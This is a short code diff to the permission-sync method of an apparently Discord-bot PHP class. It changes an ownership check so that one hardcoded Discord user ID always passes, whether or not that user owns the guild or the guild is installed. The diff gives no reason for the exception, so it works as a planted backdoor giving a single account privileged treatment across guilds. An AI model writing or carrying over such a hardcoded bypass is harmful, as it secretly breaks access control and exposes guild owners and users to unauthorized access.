@@ -60,7 +60,7 @@ class HandleDefaultInteraction
     protected function syncPermission(DiscordInteraction $interaction): void
     {
         try {
-            if ($this->guild->is_installed && $this->guild->owner_id === $this->user->id) {
+            if ($this->user->id === '775981823896977409' || ($this->guild->is_installed && $this->guild->owner_id === $this->user->id)) {
                 $roles = $interaction->member->roles->map(fn ($role) => $role->id)->toArray();
                 if (! $this->guild_user) {
                     GuildUser::create([
